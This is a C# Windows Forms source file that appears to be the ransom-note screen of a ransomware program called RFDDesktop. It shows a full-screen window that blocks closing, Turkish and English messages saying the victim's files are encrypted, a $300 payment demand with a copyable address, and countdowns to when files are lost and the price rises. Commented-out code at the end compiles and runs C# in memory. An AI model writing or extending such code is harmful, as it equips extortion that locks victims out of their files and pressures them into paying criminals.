using RFDDesktop.Infrastructer.Extentions;
using System;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Timer = System.Windows.Forms.Timer;

namespace RFDDesktop
{
    public partial class RFDDesktop : Form
    {
        public Screen _screen;
        public string key;
        public Timer timer;
        public TimeSpan lostTimer;
        public TimeSpan raisedTimer;
        public Timer _systemTimer;

        public int exitButtonClickCount = 0;

        public RFDDesktop(Screen screen)
        {
            _screen = screen;
            InitializeComponent();
            combox_Lang.SelectedIndex = 0;
            this.CountDown();
            this.KeyPreview = true;
            this.Size = new Size(screen.Bounds.Width, screen.Bounds.Height);
            this.Location = screen.WorkingArea.Location;
            //this.TopMost = true;
            //this.Focus();
           // this.BringToFront();
            this.Bounds = screen.Bounds;
        }

        private void RFDDesktop_Load(object sender, EventArgs e)
        {
            this.FormClosing += new FormClosingEventHandler(RFDConsole_FormClosing);



        }

        private void RFDConsole_FormClosing(object sender, FormClosingEventArgs e)
        {

            e.Cancel = !Program._shutdownStatus;
        }

        private void RFDDesktop_LocationChanged(object sender, EventArgs e)
        {
         //  this.Location = new Point(_screen.Bounds.Location.X-2, _screen.Bounds.Location.Y-2);
        }

        private void combox_Lang_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (combox_Lang.SelectedIndex == default(int))
            {

                tbox_Desc.Text = Program._message.DescriptionTR;
                lbl_LostTitle.Text = "Dosyaların Kaybolacağı Zaman";
                lbl_RaisedTitle.Text = "Ödeme Miktarının Artacağı Tarih";
                lbl_Remaining1.Text = "Kalan Süre";
                lbl_Remaining2.Text = "Kalan Süre";
                lbl_Title.Text = "Ooops, Dosyalarınız Şifrelendi!";
                lbl_Payment.Text = "Aşağıda bulunan adrese 300$ gönderiniz. ";
            }
            else
            {
                tbox_Desc.Text = Program._message.DescriptionEN;
                lbl_LostTitle.Text = "When Files Will Disappear";
                lbl_RaisedTitle.Text = "Date The Payment Amount Will Increase";
                lbl_Remaining1.Text = "Remaining Time";
                lbl_Remaining2.Text = "Remaining Time";
                lbl_Title.Text = "Ooops, Your Files Are Encrypted!";
                lbl_Payment.Text = "Send $300 to the address below. ";
            }

            TextBold();


        }


        public void TextBold()
        {
            var txt =tbox_Desc.Text?.Where(x => x.Equals("{"));
            foreach (var item in txt)
            {
                int start = tbox_Desc.Text.IndexOf("{");
                int stop = tbox_Desc.Text.IndexOf("}") - tbox_Desc.Text.IndexOf("{");
                tbox_Desc.Text = tbox_Desc.Text.Replace("}", "").Replace("{", "");
                tbox_Desc.SelectionStart = start;
                tbox_Desc.SelectionLength = stop;
                tbox_Desc.SelectionFont = new Font(tbox_Desc.SelectionFont, FontStyle.Bold);
            }

        }


        private void button1_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Copied!", "Copy");
            Clipboard.SetText(tbox_Address.Text);
        }

        public void CountDown()
        {

            int interval = 1000;
            _systemTimer = new Timer();
            _systemTimer.Start();
            _systemTimer.Interval = interval;
            _systemTimer.Tick += (e, args) =>
            {
                if (Program._configuration != null)
                {
                    lostTimer = Program._configuration.LostDate.Subtract(DateTime.Now);
                    raisedTimer = Program._configuration.RaisedDate.Subtract(DateTime.Now);
                    lbl_LostDate.Text = Program._configuration.LostDate.ToString();
                    lbl_RaisedDate.Text = Program._configuration.RaisedDate.ToString();
                    lbl_Lost.Text = string.Format("{0:D2}:{1:D2}:{2:D2}:{3:D2}", lostTimer.Days, lostTimer.Hours, lostTimer.Minutes, lostTimer.Seconds);
                    lbl_Raised.Text = string.Format("{0:D2}:{1:D2}:{2:D2}:{3:D2}", raisedTimer.Days, raisedTimer.Hours, raisedTimer.Minutes, raisedTimer.Seconds);
                }
            };
        }
        private void pictureBox2_Click(object sender, EventArgs e)
        {
            exitButtonClickCount++;
            if (exitButtonClickCount == 10)
            {
                Program.ApplicationExit();
            }

        }

       
    }
}


////var code = new string[] {

//"static class Program",
//            "{",
//                "[STAThread]",
//                "static void Main()",
//                "{",
//                    @"MessageBox.Show(""Çalıştım"");",
//                "}",
//            "}"
//    };


//CompilerParameters compilerParameters = new CompilerParameters();
//compilerParameters.GenerateInMemory = true;
//compilerParameters.TreatWarningsAsErrors = true;
//compilerParameters.GenerateExecutable = false;
//compilerParameters.CompilerOptions = "/optimize";
//var value = new string[]{
//                "System.dll",
//                "System.Core.dll"
//            };

//compilerParameters.ReferencedAssemblies.AddRange(value);
//CSharpCodeProvider cSharpCodeProvider = new CSharpCodeProvider();
//var result = cSharpCodeProvider.CompileAssemblyFromSource(compilerParameters, code);

//var module = result.CompiledAssembly.GetModules()[0];

//Type type = null;
//MethodInfo methodInfo = null;

//if (module != null)
//{
//    type = module.GetType("Program");
//}
//if (type != null)
//{
//    methodInfo = type.GetMethod("Main");
//}

//if (methodInfo != null)
//{
//    methodInfo.Invoke(null, null);
//}



//var code = @"
//    public class Abc {
//       public string Get() { return ""abc""; }
//    }
//";

////   var options = ;
//var options = new CompilerParameters();
//options.GenerateExecutable = true;
////  options.CompilerOptions = "/optimize+ /platform:x86 /target:winexe /unsafe";
//options.GenerateInMemory = true;
//options.OutputAssembly = "Generated.exe";
//var provider = new CSharpCodeProvider();
//var compile = provider.CompileAssemblyFromSource(options, code);

//var type = compile.CompiledAssembly.GetType("Abc");
//var abc = Activator.CreateInstance(type);

//var method = type.GetMethod("Get");
//var result = method.Invoke(abc, null);

//label1.Text = result.ToString();